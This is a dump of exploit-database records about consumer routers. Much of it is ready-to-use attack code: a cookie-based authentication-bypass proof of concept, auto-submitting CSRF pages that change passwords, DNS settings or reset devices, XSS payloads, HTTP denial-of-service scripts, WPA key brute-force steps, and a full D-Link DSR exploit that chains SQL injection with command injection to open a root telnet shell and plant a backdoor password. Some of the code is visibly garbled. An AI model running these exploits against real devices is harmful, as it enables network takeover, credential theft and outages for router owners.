The attacker can now conveniently login into the remote management web interface with full control and perform changes, obtain information, etc.
Again, the password is not needed, the attacker can just set the cookie 'admin:language=en' in his browser to gain access to the management interface or  perform other actions directly, this is just an example.
Custom implementation of the PoC exploit:
import java.net.URL;
import java.net.URLConnection;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
public class poc {
public static void main(String[] args)
try {
URL url = new URL(""http://192.168.2.1/cgi-bin/DownloadCfg/config.cfg"");
URLConnection conn = url.openConnection();
conn.setRequestProperty(""Cookie"", "":language=en"");
BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
String line;
while ((line = rd.readLine()) != null) {
System.out.println(line);
} catch(Exception e) {
e.printStackTrace();
7.Disclaimer
The contents of this advisory are copyright (c) 2013 Amplia Security (www.ampliasecurity.com), and
may be distributed freely provided that no fee is charged for distribution and proper credit is given."
2007-09-19,WebApps,CGI,azizov,LevelOne WBR3404TX Broadband Router,'RC' Cross-Site Scripting,"source: https://www.securityfocus.com/bid/25738/info
http://www.example.com/cgi-bin/ddns?RC=%40&DG0=x&DP=D&DD=[xss]
http://www.example.com/cgi-bin/ddns?RC=%40&DG0=x&DP=D&DD=&DU=[xss]","The LevelOne WBR3404TX Broadband Router is prone to multiple cross-site scripting vulnerabilities because the software fails to sufficiently sanitize user-supplied input. These issues occurs in the web management panel.
Exploiting these vulnerabilities may allow an attacker to perform cross-site scripting attacks on unsuspecting users in the context of the affected site. As a result, the attacker may be able to steal cookie-based authentication credentials and to launch other attacks.
LevelOne WBR3404TX firmware version R1.94p0vTIG is vulnerable; other versions may also be affected."
2013-12-16,WebApps,Hardware,Samandeep Singh,Beetel TC1-450 Airtel Wireless Router,Multiple Cross-Site Request Forgery Vulnerabilities,"# Exploit Title: Beetel TC1-450 Airtel Wireless Router - Multiple CSRF Vulnerabilities
# Date: 12/13/2013
# Author: SaMaN( @samanL33T )
# Vendor Homepage:http://www.beetel.in/node/10139
# Category: Hardware/Wireless Router
# Firmware Version: TM4-0Q-020 and below
# Tested on: Beetel 450-TC1 Wireless Router
# Patch/ Fix: Upgrade to latest firmware version/ move to Beetle 450-TC2","Technical Details
Beetel 450-TC1 Wireless Router has a Cross Site Request Forgery Vulnerability in its Web Console. Attacker can easily change Wireless password,Reboot Router, Reset Router,Change Router's Admin Password by simply making the user visit a CSRF link.
Exploit Code
Change Wifi (WPA2/PSK) password by CSRF
<html>
<body onload=""document.form.submit();"">
<form action=""http://[VICTIM_IP]/Forms/home_wlan_1""
method=""POST"" name=""form"">
<input type=""hidden"" name=""wlanWEBFlag"" value=""0"">
<input type=""hidden"" name=""wlan_APenable"" value=""1"">
<input type=""hidden"" name=""Countries_Channels"" value=""[Any Country]"">
<input type=""hidden"" name=""Channel_ID"" value=""00000000"">
<input type=""hidden"" name=""AdvWlan_slPower"" value=""High"">
<input type=""hidden"" name=""BeaconInterval"" value=""100"">
<input type=""hidden"" name=""RTSThreshold"" value=""2347"">
<input type=""hidden"" name=""FragmentThreshold"" value=""2346"">
<input type=""hidden"" name=""DTIM"" value=""1"">
<input type=""hidden"" name=""WirelessMode"" value=""802.11b+g"">
<input type=""hidden"" name=""WLSSIDIndex"" value=""1"">
<input type=""hidden"" name=""ESSID_HIDE_Selection"" value=""0"">
<input type=""hidden"" name=""ESSID"" value=""[SSID of WLAN]"">
<input type=""hidden"" name=""WEP_Selection"" value=""WPA2-PSK"">
<input type=""hidden"" name=""wlanWEPFlag"" value=""0"">
<input type=""hidden"" name=""wlanGEMTEKFlag"" value=""0"">
<input type=""hidden"" name=""wlanGEMTEKCMDFlag"" value=""0"">
<input type=""hidden"" name=""wlanGEMTEKDeactiveAPFlag"" value=""0"">
<input type=""hidden"" name=""wlanRadiusWEPFlag"" value=""0"">
<input type=""hidden"" name=""TKIP_Selection"" value=""AES"">
<input type=""hidden"" name=""PreSharedKey"" value=""[WIFI PASSWORD]"">
<input type=""hidden"" name=""WPARekeyInter"" value=""0"">
<input type=""hidden"" name=""WDSMode_Selection"" value=""0"">
<input type=""hidden"" name=""WDSEncryType_Selection"" value=""TKIP"">
<input type=""hidden"" name=""WDSKey"" value="""">
<input type=""hidden"" name=""WDSPeer_MAC"" value=""00:00:00:00:00:00"">
<input type=""hidden"" name=""WDSPeer_MAC"" value=""00:00:00:00:00:00"">
<input type=""hidden"" name=""WDSPeer_MAC"" value=""00:00:00:00:00:00"">
<input type=""hidden"" name=""WDSPeer_MAC"" value=""00:00:00:00:00:00"">
<input type=""hidden"" name=""WLAN_FltActive"" value=""0"">
<input type=""hidden"" name=""WLAN_FltAction"" value=""00000000"">
<input type=""hidden"" name=""WLANFLT_MAC"" value=""00:00:00:00:00:00"">
<input type=""hidden"" name=""WLANFLT_MAC"" value=""00:00:00:00:00:00"">
<input type=""hidden"" name=""WLANFLT_MAC"" value=""00:00:00:00:00:00"">
<input type=""hidden"" name=""WLANFLT_MAC"" value=""00:00:00:00:00:00"">
<input type=""hidden"" name=""WLANFLT_MAC"" value=""00:00:00:00:00:00"">
<input type=""hidden"" name=""WLANFLT_MAC"" value=""00:00:00:00:00:00"">
<input type=""hidden"" name=""WLANFLT_MAC"" value=""00:00:00:00:00:00"">
<input type=""hidden"" name=""WLANFLT_MAC"" value=""00:00:00:00:00:00"">
<input type=""hidden"" name=""CountryChange"" value=""0"">
</form>
</body>
</html>
Factory Reset Router Settings by CSRF
<html>
<body onload=""document.form.submit();"">
<form action=""http://[VICTIM_IP]/Forms/tools_system_1""
method=""POST"" name=""form"">
<input type=""hidden"" name=""restoreFlag"" value=""1"">
<input type=""hidden"" name=""Restart"" value=""RESTART"">
</form>
</body>
</html>
Change Router's Admin Password by CSRF
<html>
<body onload=""document.form.submit();"">
<form action=""http://[VICTIM_IP]/Forms/tools_admin_1""
method=""POST"" name=""form"">
<input type=""hidden"" name=""uiViewTools_Password"" value=""12345"">
<input type=""hidden"" name=""uiViewTools_PasswordConfirm"" value=""12345"">
</form>
</body>
</html>
Restart Router by CSRF
<html>
<body onload=""document.form.submit();"">
<form action=""http://[VICTIM_IP]/Forms/tools_system_1""
method=""POST"" name=""form"">
<input type=""hidden"" name=""restoreFlag"" value=""0"">
<input type=""hidden"" name=""Restart"" value=""RESTART"">
</form>
</body>
</html>
SaMaN
twitter : @samanL33T <https://twitter.com/samanL33T>"
2013-12-16,WebApps,Hardware,Matt O'Connor,UPC Ireland Cisco EPC 2425 Router / Horizon Box,WPA-PSK Handshake Information,"# Exploit Title: UPC Ireland Cisco EPC 2425 Router / Horizon Box
# Google Dork:
# Date: 11/12/2013
# Author: Matt O'Connor / Planit Computing
# Advisory Link:  http://www.planitcomputing.ie/upc-wifi-attack.pdf
# Version:
# Category: Remote
# Tested on: Cisco EPC 2425 / Horizon Box","The Cisco EPC 2425 routers supplied by UPC are vulnerable to an offline dictionary attack if the WPA-PSK handshake is obtained by an attacker.
The WPA-PSK pass phrase has the following features:
Random
A to Z Uppercase only
8 characters long
208,827,064,576 possible combinations ( AAAAAAAA  ZZZZZZZZ ) 26^8
We notified UPC about the problem in November 2011 yet UPC are still supplying customers with newer modems / horizon boxes that use this algorithm.
At the time, graphics cards were expensive and clustering several machines was not financially viable to the average hacker.
We recently purchased a used rig, comprising off:
Windows 7
I3 Processor
4GB RAM
2TB Drive
Radeon HD 5850
We generated 26 dictionary files using mask processor by ATOM, piping each letter out to its own file, for example:
A:  ./mp32 A?u?u?u?u?u?u?u > A.TXT = AAAAAAAA  AZZZZZZZ
B: ./mp32 B?u?u?u?u?u?u?u > B.TXT = BAAAAAAA  BZZZZZZZ
etc
Each .txt file weighed in at around 60GBs each.  The 26 files took up about 1.6TB of storage.
We now had the complete key space, partitioned into 26 different files.  This allowed us to distribute the brute force attack amongst multiple computers.  There are other ways with ocl-hashcat but this was the simplest.
Using our Radeon HD5850 on standard settings, we were hitting 80,000 keys per second.  Breakdown below:
26^8 = 208,827,064,576 ( 208 billion possible combinations )
26^8 / 80,000 keys per second = 2,610,338 seconds
2,610,338 / 60 seconds = 43,505 minutes
43,505 / 60 minutes = 725 hours
725 hours / 24 hours = 30 Days
For 185, we had built a computer that could crack the default UPC wireless password within 30 days.  The WPA-PSK handshake we used started with the letter D and was cracked within 96 hours.
We ended up getting a second machine for the same price which resulted in our maximum cracking time being reduced to 15 days.
If youre using the default password on your UPC broadband connection, we recommend changing it immediately to a more secure password, using a mix of letters, numbers and symbols."
2013-12-12,WebApps,Hardware,condis,Pentagram Cerberus P 6363 DSL Router,Multiple Vulnerabilities,#Please don't change this file by hand,"PENTAGRAM Cerberus P 6363 DSL Router Multiple Vulnerabilities
Found by condis
Vendor Site / Model: http://www.pentagram.pl/produkty/cerberus-p-6363
Firmware version: V5.07.28_PEN01
Software version: V3.0
1. Prolog
Cerberus P 6363 is simple SOHO class router. Its producer claims that it may act
as a 4 port switch and has an advanced firewall (...)
Device management is only possible through WWW GUI and because of that, GUI was
targeted and is subject of this raport.
2. Authentication Bypass (CWE-592)
This bug is really trivial. All we need to do is set up ""special"" cookie before
accessing GUI:
condis@pandorum:~$ wget http://192.168.1.100/cgi-bin/DownloadCfg/RouterCfm.cfg -t 1 -nv -O pento.cfg
2013-12-11 23:06:46 URL:http://192.168.1.100/login.asp [3663] -> ""pento.cfg"" [1]
condis@pandorum:~$ head -n 5 pento.cfg
<html>
<head>
<META http-equiv=""Content-Type"" content=""text/html; charset=iso-8859-1"">
<title>PENTAGRAM Cerberus P 6363</title>
<script type=""text/javascript"" src=""lang/b28n.js""></script>
and now lets try some voodoo magic :x
condis@pandorum:~$ wget http://192.168.1.100/cgi-bin/DownloadCfg/RouterCfm.cfg -t 1 -nv -O pento.cfg --header=""Cookie: admin:language=en""
condis@pandorum:~$ head -n 5 pento.cfg
dhcp_static_lease3=
sb/1/ofdm2gpo=0x66442200
wl_radius_port=1812
wl0.1_radius_port=1812
3. Multiple Cross Site Scripting (CWE-79)
GUI has some simple function that filters out non-alphanumeric characters but it
is written in JavaScript, and as we all know, implementing protection only on
client-side is no protection at all.
One of attack methods would be to turn off JavaScript or write some simple scripts
(i.e.: using curl, wget, etc) that won't interpret JS code like web browser does.
Second method (which is preferred by me) is to make configuration backup; modify
it manually changing relevant variables/directives and then reupload it back to
the device.
3.1 Setting WI-FI Password
wl_wpa_psk=wifi_password"";alert('XSS');//
This code will be executed on index page.
3.2 Setting URL Filtration
filter_url0=192.168.1.12-192.168.1.13:bar,0-6,0-0,on,foo"");alert('XSS');//
If ""filter_url_mode"" is disabled, we must change it to ""deny"" or ""pass"". Code
injected here will be executed in Security Settings -> URL Filter Setting page.
3.3 Setting MAC Address Filtration
filter_mac0=DE:AD:DE:AD:DE:AD,0-6,0-0,on,gangbang');alert('xss');//
If ""filter_mac_mode"" variable is disabled, we must change it to ""deny"" or ""pass"".
Code injected here will be executed in Security Settings -> MAC Address Filter
Settings.
Probably there are more XSS flaws, but I stopped searching after those three...
4. Cross Site Request Forgery (CWE-352)
There is no mechanism preventing CSRF attacks by which it is possible to enforce
any operation on the logged administrator. Below there is simple proof of concept
which enables httpd to WAN (access from IP = 69.69.69.69) :
----- cerber_csrf_poc.html -----------------------------------------------------
<body><script>
* Cross Site Request Forger v1.1
* by condis
* Simple utility which aim is to help in
* testing and exploiting CSRF flaws.
* If You don't know how to use it, then
* do NOT use it :)
var CSRForger = function()
var f = document.createElement('form');
var obj = {
'target' : '',
'method' : 'post',
'debug'  : false,
'addInput' : function(name, value)
var i = document.createElement('input');
i.name  = name;
i.value = value;
i.type  = name == 'submit' ? 'submit' : (this.debug === 2) ? 'text' : 'hidden';
f.appendChild(i);
'addInputs' : function(post)
for (var field in post)
this.addInput(field, post[field]);
'csrForge' : function()
f.method = (this.method == 'post') ? 'POST' : 'GET';
f.action = this.target;
f.target = ""gangbang"";
var i = document.createElement('iframe');
i.style.width  = '100%';
i.style.height = '500px';
if(this.debug === 0 || this.debug === false)
f.style.display = 'none';
i.style.display = 'none';
i.name = f.target;
i.src  = f.action;
document.body.appendChild(f);
document.body.appendChild(i);
document.getElementsByName('submit').item(0).click();
return obj;
var cerb = new CSRForger();
cerb.target = 'http://192.168.1.100/goform/SafeWanWebMan';
cerb.method = 'GET';
cerb.addInputs({
'GO' : 'system_remote.asp',
'RMEN' : '1',
'port': '8080',
'IP' : '69.69.69.69',
'submit': 'go go power rangers'
cerb.csrForge();
</script></body>
----- cerber_csrf_poc.html -----------------------------------------------------
5. Epilogue
I tried to estalish a dialogue with vendor (07.12.2013) but they didn't respond
for five days (probably they don't give a fuck about security) so I decided to
publish all bugs.
Also, what's obvious there is no patch so best solution that I can think of now
is to stop using P 6363 and try other version. (P 6362 has different firmware
and at first glance it looked better)."
2007-06-08,Remote,Hardware,Secunia Research,3Com OfficeConnect Secure Router 1.04-168,'Tk' Cross-Site Scripting,"source: https://www.securityfocus.com/bid/24374/info
http://example.com/cgi-bin/admin?page=1&tk=>[xss]","OfficeConnect Secure Router is prone to a cross-site scripting vulnerability.
Exploiting this vulnerability may allow an attacker to perform cross-site scripting attacks on unsuspecting users in the context of the affected website. As a result, the attacker may be able to steal cookie-based authentication credentials and to launch other attacks.
This issue affects OfficeConnect Secure Router firmware 1.04-168; other versions may also be affected."
2013-12-06,WebApps,Hardware,0_o,D-Link DSR Router Series,Remote Command Execution,"#!/usr/bin/python
# CVEs:                  CVE-2013-5945 - Authentication Bypass by SQL-Injection
#                        CVE-2013-5946 - Privilege Escalation by Arbitrary Command Execution
# Vulnerable Routers:    D-Link DSR-150 (Firmware < v1.08B44)
#                        D-Link DSR-150N (Firmware < v1.05B64)
#                        D-Link DSR-250 and DSR-250N (Firmware < v1.08B44)
#                        D-Link DSR-500 and DSR-500N (Firmware < v1.08B77)
#                        D-Link DSR-1000 and DSR-1000N (Firmware < v1.08B77)
# Likely to work on:     D-Link DWC-1000
# Download URL:          http://tsd.dlink.com.tw
# Arch:                  mips and armv6l, Linux
# Author:                0_o -- null_null
#                        nu11.nu11 [at] yahoo.com
#                        Oh, and it is n-u-one-one.n-u-one-one, no l's...
#                        Wonder how the guys at packet storm could get this wrong :(
# Date:                  2013-08-18
# Purpose:               Get a non-persistent root shell on your D-Link DSR.
# Prerequisites:         Network access to the router ports 443 and 23.
#                        !!! NO AUTHENTICATION CREDENTIALS REQUIRED !!!
# Coordinated Disclosure -- history and timeline:
# 2013-09-12:   Informed Heise Security and asked for their support on this case
# 2013-09-13:   Informed the manufacturer D-Link via
#               http://www.dlink.com/us/en/support/security-advisories/report-vulnerabilities/  (contact form is buggy!)
#               http://www.d-link.co.za/contactus/feedback/ (contact request submitted)
#               http://www.dlink.com/de/de/contact-d-link (contact form is buggy!)
#               mail@dlink.ru (contact request sent)
#               info@dlink.ee (contact request sent)
#               info@dlink.de (contact request sent)
# 2013-09-14:   Informed the German Federal Office for Information Security (BSI) via certbund@bsi.bund.de
# 2013-09-16:   D-Link Russia and D-Link Germany claim to have forwarded my request.
# 2013-09-17:   German BSI responds, contact established.
# 2013-09-24:   Requested CVE-IDs.
# 2013-09-25:   Heise responds, contact established.
# 2013-09-27:   D-Link asks for details on vulns and the exploit code.
#               Mitre assigns two CVEs:
#                  CVE-2013-5945 -- authentication bypass
#                  CVE-2013-5946 -- privilege escalation
# 2013-09-30:   D-Link has received the exploit and documentation via BSI
# 2013-11-29:   Patches are available for the DSR router series via tsd.dlink.com.tw
#                 DSR-150:                Firmware v1.08B44
#                 DSR-150N:               Firmware v1.05B64
#                 DSR-250 and DSR-250N:   Firmware v1.08B44
#                 DSR-500 and DSR-500N:   Firmware v1.08B77
#                 DSR-1000 and DSR-1000N: Firmware v1.08B77
# 2013-12-03:   Public Disclosure
# And now - the fun part :-)
# CHANGE THESE VALUES -- BEGIN
# Your router's IP:PORT
# Password to be set (by this hack) on the backdoor account
# CHANGE THESE VALUES -- END
# persistent config file:    /tmp/teamf1.cfg.ascii
#                            Edit this file to make your changes persistent.
# ""  957 root      2700 S    /usr/sbin/telnetd -l /bin/login""
# telnetd is running
# Stopping the running telnetd
# Starting a new telnetd
# Logging into the router
# Starting a telnetd with custom parameters
# Do the h4cK
# doesn't work for some odd reason -- too lazy to find out why
#salt = ''.join(random.sample(s1,8))
#line[1] = crypt.crypt(bdpasswd, '$1$' + salt + '$')
# Switching back to the originals
# Logging out
# Print success message","import httplib
import urllib
import telnetlib
import time
import sys
import crypt
import random
import string
ipaddr = ""192.168.10.1:443""
bdpasswd = ""password""
cookie = """"
pid = -2
bduser = """"
def request(m = """", u = """", b = """", h = """"):
global ipaddr
conn = httplib.HTTPSConnection(ipaddr, timeout = 15)
assert m in [""GET"", ""POST""]
conn.request(method = m, url = u, body = b, headers = h)
ret = conn.getresponse()
header = ret.getheaders()
data = ret.read()
conn.close()
return (header, data)
def login(user, passwd):
global ipaddr
headers = {'Accept': ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"",
'User-Agent': ""Exploit"",
'Referer': ""https://"" + ipaddr + ""/scgi-bin/platform.cgi"",
'Content-Type': ""application/x-www-form-urlencoded""}
body = {'thispage'                          : ""index.htm"",
'Users.UserName'                    : user,
'Users.Password'                    : passwd,
'button.login.Users.deviceStatus'   : ""Login"",
'Login.userAgent'                   : ""Exploit""}
return request(""POST"", ""/scgi-bin/platform.cgi"", urllib.urlencode(body), headers)
def logout():
global ipaddr, cookie
headers = {'Accept': ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"",
'User-Agent': ""Exploit"",
'Referer': ""https://"" + ipaddr + ""/scgi-bin/platform.cgi"",
'Content-Type': ""application/x-www-form-urlencoded""}
body = """"
return request(""GET"", ""/scgi-bin/platform.cgi?page=index.htm"", urllib.urlencode(body), headers)
def execCmd(cmd = None):
global ipaddr, cookie
assert cmd != None
headers = {'Accept': ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"",
'User-Agent': ""Exploit"",
'Referer': ""https://"" + ipaddr + ""/scgi-bin/platform.cgi?page=systemCheck.htm"",
'Cookie': cookie,
'Content-Type': ""application/x-www-form-urlencoded""}
body = {'thispage'                          : ""systemCheck.htm"",
'ping.ip'                           : ""localhost;"" + cmd,
'button.traceroute.diagDisplay'     : ""Traceroute""}
return request(""POST"", ""/scgi-bin/platform.cgi"", urllib.urlencode(body), headers)
def findPid(mystr = None):
assert mystr != None
mypid = 0
(h, d) = execCmd(cmd = ""ps|grep telnetd|grep -v grep"");
s = d.find(mystr)
if s > 0:
cand = d[s - 50 : s]
try:
mypid = int(cand.split(""\n"")[1].split()[0])
except IndexError:
mypid = int(cand.split("">"")[1].split()[0])
return mypid
def restartTelnetd(mystr1 = None, mystr2 = None):
assert mystr1 != None and mystr2 != None
global pid
pid = findPid(""telnetd -l /bin/"")
if pid > 0:
print ""[+] Stopping telnetd ("" + str(pid) + ""): "",
sys.stdout.flush()
(h, d) = execCmd(""kill "" + str(pid))
pid = findPid(mystr1)
if pid > 0:
print ""FAILURE""
sys.exit(-1)
else:
print ""OK""
print ""[+] Starting telnetd: "",
sys.stdout.flush()
(h, d) = execCmd(""telnetd -l "" + mystr2)
pid = findPid(""telnetd -l "" + mystr2)
if pid > 0:
print ""OK ("" + str(pid) + "")""
else:
print ""FAILURE""
sys.exit(-1)
def main():
global ipaddr, cookie, pid, bduser, bdpasswd
user = ""admin""
passwd = ""' or 'a'='a""
print ""\n\nPrivilege Escalation exploit for D-Link DSR-250N (and maybe other routers)""
print ""This change is non-persistent to device reboots.""
print ""Created and coded by 0_o (nu11.nu11 [at] yahoo.com)\n\n""
print ""[+] Trying to log into the router: "",
sys.stdout.flush()
(h, d) = login(user, passwd)
if d.find(""User already logged in"") > 0:
print ""FAILURE""
print ""[-] The user \""admin\"" is still logged in. Please log out from your current session first.""
sys.exit(-1)
elif d.find('<a href=""?page=index.htm"">Logout</a>') > 0:
while h:
(c1, c2) = h.pop()
if c1 == 'set-cookie':
cookie = c2
break
print ""OK ("" + cookie + "")""
elif d.find(""Invalid username or password"") > 0:
print ""FAILURE""
print ""[-] Invalid username or password""
sys.exit(-1)
else:
print ""FAILURE""
print ""[-] Unable to login.""
sys.exit(-1)
print ""[+] Preparing the hack...""
restartTelnetd(""/bin/login"", ""/bin/sh"")
print ""[+] Hacking the router...""
print ""[+] Getting the backdoor user name: "",
sys.stdout.flush()
tn = telnetlib.Telnet(ipaddr.split("":"")[0])
tn.read_very_eager()
tn.write(""cat /etc/profile\n"")
time.sleep(5)
data = tn.read_very_eager()
for i in data.split(""\n""):
if i.find('""$USER""') > 0:
bduser = i.split('""')[3]
break
if len(bduser) > 0:
print ""OK ("" + bduser + "")""
else:
print ""FAILURE""
sys.exit(-1)
print ""[+] Setting the new password for "" + bduser + "": "",
sys.stdout.flush()
tn.write(""cat /etc/passwd\n"")
time.sleep(5)
data = tn.read_very_eager()
data = data.split(""\n"")
data.reverse()
data.pop()
data.reverse()
data.pop()
data = ""\n"".join(data)
for i in data.split(""\n""):
if i.find(bduser) >= 0:
line = i.split(':')
s1 = string.lowercase + string.uppercase + string.digits
salt = ''.join(random.sample(s1,2))
pw = crypt.crypt(bdpasswd, salt)
line[1] = pw
data = data.replace(i, "":"".join(line))
break
tn.write('echo -en """" > /etc/passwd\n')
time.sleep(5)
for i in data.split(""\n""):
tn.write('echo -en \'' + i + '\n\' >> /etc/passwd\n')
time.sleep(1)
data = tn.read_very_eager()
tn.close()
if data.find(pw) >= 0:
print ""OK ("" + pw + "")""
success = True
else:
print ""FAILURE""
print ""[-] Could not set the new password.""
sys.exit(-1)
print ""[+] Mobbing up...""
restartTelnetd(""/bin/sh"", ""/bin/login"")
print ""[+] Logging out: "",
sys.stdout.flush()
(h, d) = logout()
if d.find('value=""Login""') > 0:
print ""OK""
else:
print ""FAILURE""
print ""[-] Unable to determine if user is logged out.""
if success:
print ""[+] You can now log in via SSH and Telnet by using:""
print ""    user: "" + bduser
print ""    pass: "" + bdpasswd
print ""    These changes will be reverted upon router reboot.""
print ""    Edit \""/tmp/teamf1.cfg.ascii\"" to make your changes persistent.""
main()
sys.exit(0)"
2013-11-30,DoS,Hardware,Dino Causevic,TP-Link TL-WR740N / TL-WR740ND 150M Wireless Lite N Router,HTTP Denial of Service,"# Exploit title: 150M Wireless Lite N Router HTTP DoS
# Date: 28.11.2013
# Exploit Author: Dino Causevic
# Hardware Link: http://www.tp-link.com/en/products/details/?model=TL-WR740N
# Vendor Homepage: http://www.tp-link.com/
# Contact: dincaus (packetstormsecurity.com)
# CVE:
# Firmware Version:3.12.11 Build 120320 Rel.51047n
# ===================================================================================================
#   Just execute Python script below
# ===================================================================================================
# Usage: python TP_Link_DoS.py <IP> <Port>
# 150M Wireless Lite N Router, Model No. TL-WR740N / TL-WR740ND sending HTTP request with the headers inserted
# below in the script will crash HTTP Server.
#!/usr/bin/python","import socket
import import
sys urllib2
host = """"
port = 0
if(len(sys.argv) >= 2):
host = sys.argv[1]
port = sys.argv[2]
else:
print ""Invalid number of the arguments.""
print ""Usage <server> <port>""
exit(1)
print ""Connecting on "",host,"":"",port
s = socket.socket();
stringOfDeath = ""GET / HTTP/1.1\r\n"";
stringOfDeath = stringOfDeath + ""Accept-Encoding: identity\r\n"";
stringOfDeath = stringOfDeath + ""Host: ""+ host + ""\r\n"";
stringOfDeath = stringOfDeath + ""Connection: close\r\n"";
stringOfDeath = stringOfDeath + ""User-Agent: PythonLib/2.7\r\n"";
s.connect((host,int(port)))
print ""Sending packet...""
s.send(stringOfDeath)
print ""Packet sent.""
print ""Check if router http server down...""
try:
response = urllib2.urlopen(""http://""+host+"":""+port,None,5)
response.read()
except socket.timeout:
print ""Timeout occured, http server probaly down.""
exit(1)"
2007-03-20,DoS,Hardware,Joxean Koret,ZYXEL Router 3.40 Zynos,SMB Data Handling Denial of Service,source: https://www.securityfocus.com/bid/23061/info,"Zyxel Routers running the ZynOS operating system are prone to a remote denial-of-service vulnerability.
An attacker can exploit this issue to crash the affected device, denying further network service to legitimate users.
This issue affects Zyxel routers running ZynOS version 3.40.
sr(SMBMailSlot(name='\\M'))"
2013-11-15,WebApps,Hardware,Yakir Wizman,WBR-3406 Wireless Broadband NAT Router,Web-Console Password Change Bypass / Cross-Site Request Forgery,"# -----------------------------------------------------------
# WBR-3406 Wireless Broadband NAT Router Web-Console Password Change Bypass & CSRF Vulnerability
# This PoC code should do two main things:
# 1. Cross Site Request Forgery (For more information, just google it).
# 2. This code change to new password without know the current password.
# The vulnerability work in a way that if we remove the ""PA="" parameter which is the current password
# the application ignore that and change the password without even entering the old / current password.
# Bug discovered by Pr0T3cT10n AKA Yakir Wizman, <yakir.wizman@gmail.com>
# Date 17/08/2012
# Vendor site - http://www.level1.com/
# ISRAEL
# -----------------------------------------------------------
#       Author will be not responsible for any damage.
# -----------------------------------------------------------
# PoC EXPLOIT
# -----------------------------------------------------------
# -----------------------------------------------------------","<html>
<body>
<form action=""http://192.168.123.254/cgi-bin/pass"" method=""POST"">
<input type=""hidden"" name=""rc"" value=""@"" />
<input type=""hidden"" name=""Pa"" value=""1234567"" />
<input type=""hidden"" name=""P1"" value=""1234567"" />
<input type=""hidden"" name=""rd"" value=""atbox"" />
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>"
2013-10-30,WebApps,Hardware,absane,Unicorn Router WB-3300NR,Cross-Site Request Forgery (Factory Reset/DNS Change),"# Exploit Title:     Unicorn Router WB-3300NR CSRF (Factory Reset/DNS Change)
# Exploit Author:    absane
# Blog:              http://blog.noobroot.com
# Discovery date:    October 29th 2013
# Vendor Homepage:   http://www.eunicorn.co.kr/kimsboard7/_product.php?inc=wb-3300nr
# Tested on:         Unicorn WB-3300NR v1.0
# Firmware Version:  V5.07.18_ko_UIS02","*Vulnerability*
The WB-3300NR Unicorn Router suffers from numerous CSRF vulnerabilities.
Considering that by default the administrative pages do not require authentication, countless exploits exist.
*Proof of Concept*
1) Factory Reset
<html><body>
<iframe height=0 width=0 id=""cantseeme"" name=""cantseeme""></iframe>
<form name=""csrf_form"" action=""http://192.168.123.254/goform/SysToolRestoreSet"" method=""post"" target=""cantseeme"">
<input type=""hidden"" name=""CMD"" value='SYS_CONF'>
<input type=""hidden"" name=""GO"" value='system_reboot.asp'>
<input type=""hidden"" name=""CCMD"" value='0'>
<script>document.csrf_form.submit();</script>
</body></html>
2) Alter the DNS Settings
<html><body>
<iframe height=0 width=0 id=""cantseeme"" name=""cantseeme""></iframe>
<form name=""csrf_form"" action=""http://192.168.123.254/goform/AdvSetDns"" method=""post"" target=""cantseeme"">
<input type=""hidden"" name=""GO"" value='wan_dns.asp'>
<input type=""hidden"" name=""rebootTag"" value=''>
<input type=""hidden"" name=""DSEN"" value='1'>
<input type=""hidden"" name=""DNSEN"" value='on'>
<input type=""hidden"" name=""DS1"" value='8.8.4.4'>
<input type=""hidden"" name=""DS2"" value='8.8.8.8'>
<script>document.csrf_form.submit();</script>
</body></html>
3) WPA Password Disclosure (possibility)(not proven)
The following PoC code only demostrates that with CSRF and XSS, it might be possible to obtain the WPA password.
However, I have been unable to do so without forcing the router to revert to factory defaults.
<html><body>
<iframe height=0 width=0 id=""cantseeme"" name=""cantseeme""></iframe>
<form name=""csrf_form"" action=""http://192.168.123.254/goform/WizardHandle"" method=""post"" target=""cantseeme"">
<input type=""hidden"" name=""MACC"" value='""; var x = """"; function y() {alert(def_wirelesspassword);} x = window.setTimeout(y,2000);//'>
<script>document.csrf_form.submit();</script>
</body></html>"
2006-10-31,Remote,Hardware,LegendaryZion,ECI Telecom B-Focus ADSL2+ Combo332+ Wireless Router,Information Disclosure,"source: https://www.securityfocus.com/bid/20834/info
http://www.example.com/html/defs/","ECI Telecom's B-FOCuS ADSL2+ Combo332+ wireless router is prone to an information-disclosure vulnerability. The router's Web-Based Management interface fails to authenticate users before providing access to sensitive information.
Exploiting this issue may allow an unauthenticated remote attacker to retrieve sensitive information from the affected device, which may aid in further attacks."
2013-10-10,DoS,Hardware,Matias Mingorance Svensson,ONO Hitron CDE-30364 Router,Denial of Service,"#!/usr/bin/python
#Description:
#Hitron Technologies CDE-30364 is a famous ONO Router.
#The Hitron Technologies CDE-30364's web interface (listening on tcp/ip port 80), have a problem to insufficient bounds checking of data supplied in HTTP GET requests. The default ip adress of this adsl router, used for management purpose, is 192.168.1.1.
#Send Request
#Check 80 port","import httplib
import socket
import time
import sys
print ""\n###########################################################################################################""
print ""# Exploit Title: Router ONO Hitron CDE-30364 - Denial Of Service(80 port)                                 #""
print ""# Date: 8-10-2013                                                                                         #""
print ""# Exploit Author: Matias Mingorance Svensson - matias.ms[at]owasp.org                                     #""
print ""# Vendor Homepage: http://www.ono.es/clientes/te-ayudamos/dudas/internet/equipos/hitron/hitron-cde-30364/ #""
print ""# Tested on: Hitron Technologies CDE-30364                                                                #""
print ""# Version HW: 1A                                                                                          #""
print ""# Version SW: 3.1.0.8-ONO                                                                                 #""
print ""###########################################################################################################\n""
print ""Sending the request to router ONO Hitron CDE-30364...\n""
connct = httplib.HTTPConnection(sys.argv[1],80)
connct.request(""GET"", ""AAAAAAAAAA""*10001)
connct.close()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
time.sleep(5)
try:
s.connect((sys.argv[1], 80))
s.shutdown(2)
print ""Attack Fail!\n""
except:
print ""Attack Successful! The router administration page is down!\n"""
2013-09-30,WebApps,Hardware,SANTHO,Tenda W309R Router 5.07.46,Configuration Disclosure,"# Exploit Title: Tenda W309R Configuration Enumeration without
# Author: SANTHO <<@s4n7h0>>
# Vendor Homepage: http://www.tenda.cn
# Product link: http://www.tenda.cn/tendacn/product/show.aspx?productid=382
# Category: Hardware/Wireless Router
# Firmware Version : V5.07.46","Authentication
Technical Details
Tenda Wireless Router W309R doesn't have proper authentication for the web
